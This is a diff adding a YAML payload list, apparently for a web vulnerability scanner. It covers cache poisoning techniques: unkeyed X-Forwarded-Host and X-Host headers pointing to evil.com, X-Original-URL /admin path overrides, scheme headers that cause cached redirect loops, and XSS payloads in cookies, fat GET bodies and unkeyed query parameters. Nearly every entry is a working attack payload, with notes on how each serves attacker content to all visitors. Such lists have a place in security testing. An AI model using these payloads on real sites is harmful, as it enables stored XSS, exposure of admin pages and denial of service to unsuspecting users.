@@ -1,0 +1,149 @@
+defaults:
+  vuln_type: cache_poisoning
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # Unkeyed Header — X-Forwarded-Host
+  # ============================================================
+  - technique: unkeyed_header
+    injection_surface: header
+    evidence_type: content_match
+    risk: 3
+    payload: "X-Forwarded-Host: evil.com"
+    notes: "X-Forwarded-Host cache poisoning. If the cache does not include X-Forwarded-Host in its key but the application uses it to generate URLs (e.g., in script src, link href, or redirect targets), the cached response serves attacker-controlled URLs to all users."
+    tags: [xfh, forwarded_host, url_generation]
+
+  - technique: unkeyed_header
+    injection_surface: header
+    evidence_type: content_match
+    risk: 4
+    payload: "X-Forwarded-Host: COLLAB_DOMAIN"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "X-Forwarded-Host with collaborator. Inject collaborator domain and check if it appears in cached response body (e.g., in asset URLs, canonical links, or Open Graph tags). Then fetch the page without the header to confirm the poisoned response is served from cache."
+    tags: [xfh, collaborator, verification]
+
+  # ============================================================
+  # Unkeyed Header — X-Original-URL / X-Rewrite-URL
+  # ============================================================
+  - technique: unkeyed_header
+    injection_surface: header
+    evidence_type: response_diff
+    risk: 3
+    payload: "X-Original-URL: /admin"
+    notes: "X-Original-URL cache poisoning. Some web servers (IIS, Nginx) use this header to override the request path. If the cache keys on the visible URL but the back-end serves content for /admin, the admin page is cached at the public URL."
+    tags: [x_original_url, path_override, iis]
+
+  - technique: unkeyed_header
+    injection_surface: header
+    evidence_type: response_diff
+    risk: 3
+    payload: "X-Rewrite-URL: /admin"
+    notes: "X-Rewrite-URL cache poisoning. Similar to X-Original-URL but used by IIS URL Rewrite module. The back-end processes /admin while the cache stores the response under the original benign URL."
+    tags: [x_rewrite_url, path_override, iis, rewrite]
+
+  # ============================================================
+  # Unkeyed Header — X-Forwarded-Scheme / X-Forwarded-Proto
+  # ============================================================
+  - technique: unkeyed_header
+    injection_surface: header
+    evidence_type: redirect
+    risk: 3
+    payload: "X-Forwarded-Scheme: http"
+    notes: "X-Forwarded-Scheme redirect poisoning. If the application forces HTTPS by checking X-Forwarded-Scheme, injecting 'http' causes a 301/302 redirect to the HTTPS version. If cached, all users receive the redirect loop, causing denial of service."
+    tags: [xfs, scheme, redirect, dos]
+
+  - technique: unkeyed_header
+    injection_surface: header
+    evidence_type: redirect
+    risk: 3
+    payload: "X-Forwarded-Proto: http"
+    notes: "X-Forwarded-Proto redirect poisoning. Similar to X-Forwarded-Scheme. If the app sees proto=http and issues a redirect to https://, that redirect is cached and served to all subsequent visitors."
+    tags: [xfp, proto, redirect, dos]
+
+  # ============================================================
+  # Unkeyed Header — Other Headers
+  # ============================================================
+  - technique: unkeyed_header
+    injection_surface: header
+    evidence_type: content_match
+    risk: 3
+    payload: "X-Forwarded-For: evil.com"
+    notes: "X-Forwarded-For in cached response. If the application reflects X-Forwarded-For in the page (e.g., debug info, logging panels, IP-based content), and the cache does not key on it, all users see the attacker's value."
+    tags: [xff, reflection, debug]
+
+  - technique: unkeyed_header
+    injection_surface: header
+    evidence_type: content_match
+    risk: 3
+    payload: "X-Host: evil.com"
+    notes: "X-Host header poisoning. Alternative to X-Forwarded-Host used by some application frameworks. If the app generates URLs from X-Host and the cache ignores it, responses with attacker-controlled URLs are cached."
+    tags: [x_host, forwarded, url_generation]
+
+  - technique: unkeyed_header
+    injection_surface: header
+    evidence_type: content_match
+    risk: 3
+    payload: "X-Forwarded-Prefix: /evil"
+    notes: "X-Forwarded-Prefix poisoning. If the application prepends X-Forwarded-Prefix to URL paths (common in Spring Boot behind a reverse proxy), cached responses contain corrupted links pointing to attacker-controlled path prefixes."
+    tags: [xfp, prefix, spring, url_generation]
+
+  # ============================================================
+  # Unkeyed Cookie
+  # ============================================================
+  - technique: unkeyed_cookie
+    injection_surface: header
+    evidence_type: content_match
+    risk: 3
+    payload: "Cookie: language=<script>alert(1)</script>"
+    notes: "Unkeyed cookie cache poisoning. If the cache does not key on cookies but the application uses a cookie value (e.g., language preference) to render page content, the XSS payload is served to all users from cache."
+    tags: [cookie, language, xss, reflection]
+
+  - technique: unkeyed_cookie
+    injection_surface: header
+    evidence_type: content_match
+    risk: 3
+    payload: "Cookie: region=evil-region\"><script>alert(1)</script>"
+    notes: "Unkeyed region cookie. If a region/locale cookie is reflected in the HTML (e.g., in a dropdown or banner) and the cache does not key on it, the XSS payload persists in the cached response."
+    tags: [cookie, region, xss, breakout]
+
+  # ============================================================
+  # Fat GET (Body in GET Request)
+  # ============================================================
+  - technique: fat_get
+    injection_surface: query
+    evidence_type: response_diff
+    risk: 3
+    payload: "GET /api/endpoint HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 19\r\n\r\nparam=evil_value"
+    placeholders: [TARGET]
+    notes: "Fat GET cache poisoning. Some frameworks (e.g., Flask, Express) parse the body of a GET request. The cache keys on the URL and query string only, ignoring the body. If the app uses the body param to render content, the poisoned response is served from cache to all users."
+    tags: [fat_get, body, get_request, framework]
+
+  - technique: fat_get
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "GET /search?q=normal HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 31\r\n\r\nq=<script>alert(1)</script>"
+    placeholders: [TARGET]
+    notes: "Fat GET parameter override. If the back-end prioritizes body parameters over query parameters, the body value of 'q' overrides the URL value. The cache keys on ?q=normal, but the response contains the XSS from the body."
+    tags: [fat_get, param_override, xss, query_body_conflict]
+
+  # ============================================================
+  # Unkeyed Query Parameters
+  # ============================================================
+  - technique: unkeyed_header
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "utm_content=<script>alert(1)</script>"
+    notes: "Unkeyed query parameter (UTM). Many CDNs strip or ignore UTM parameters from the cache key to improve hit rates. If the application reflects utm_content in the page, the XSS is cached and served to all visitors of the same URL without UTM params."
+    tags: [unkeyed_param, utm, xss, cdn]
+
+  - technique: unkeyed_header
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "cb=<script>alert(1)</script>"
+    notes: "Unkeyed cache-buster parameter. Parameters like 'cb', '_', 'cachebust', or 'nocache' are often stripped from the cache key. If reflected in the response, the XSS payload is served from cache."
+    tags: [unkeyed_param, cachebuster, xss, reflection]
